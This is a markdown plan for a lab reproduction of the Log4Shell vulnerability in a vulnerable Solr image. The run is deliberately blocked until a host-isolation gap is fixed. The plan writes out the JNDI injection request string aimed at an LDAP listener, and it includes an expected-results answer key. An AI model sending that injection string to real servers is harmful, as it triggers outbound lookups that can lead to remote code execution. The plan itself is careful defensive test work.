# Real Log4Shell B2 reproduction — PLAN ONLY, status NOT_TESTED (blocked)

Status: **NOT_TESTED — BLOCKED on host-isolation fix.**

## Why this is not run yet

The current `internal: true` bridge still routes to host-gateway services: the
attacker container reaches the host's `sshd:22` (measured — see
`reports/overnight/evidence/poc-eng/log4shell-callback-result.json`,
`isolation_measured.egress.host_gw_22 = REACHED`). The cross-branch reviewer
finding (§5) flags this as a real isolation-boundary gap, owned by infra-eng and
pending a Lead/product decision.

Running a **real vulnerable image that can be driven to RCE** (vulhub
`solr:8.11.0` / Log4j 2.14.1) inside a network that can still reach the host would
put an exploitable service one gateway hop from host services. Per the overnight
safety rules and the reviewer's instruction, **no real vulnerable image is run and
no real exploit is executed until the host-isolation gap is fixed and reviewed.**

## What a faithful real-B2 reproduction would be (to run AFTER the fix)

Target: `vulhub/solr:8.11.0` (contains Log4j 2.14.1 — the real CVE-2021-44228
code path). Trigger per vulhub README:
`GET /solr/admin/cores?action=${jndi:ldap://<in-lab-listener>:1389/x}`.

- Attacker container issues the request (in-lab only).
- The in-lab listener is the **same detection-only recorder** used here: it accepts
  the LDAP connection and returns NOTHING — no referral, no class. This proves the
  real Log4j JNDI lookup fires (real B2) WITHOUT any code execution.
- Network: a bridge with host-gateway isolation enabled (infra fix), `internal`,
  no egress; verified before the run by probing host `:22` and expecting refusal.

### Expected results (answer key, to confirm after the fix)
| check | expected | grading |
|---|---|---|
| host-gateway `:22` from attacker | refused/unreachable | precondition; abort if REACHED |
| internet `8.8.8.8:53` | unreachable | precondition |
| benign `GET /solr/...` (no jndi) | no callback recorded | — |
| crafted `action=${jndi:ldap://listener:1389/x}` | exactly one LDAP callback from the Solr container's IP | **B2 reproduced (real)** |
| listener response | empty (no payload served); no RCE | safety invariant |

Only after that run may the result be graded `B2 = real reproduction`. B1 (full
RCE) and Windows-only steps remain substitute/BLOCKED per `expected.md`.

`run_real_vuln.py` in this directory is a deliberately **inert guard**: it does not
deploy anything and exits NOT_TESTED until the isolation gap is cleared and this
file is updated to authorize the run.
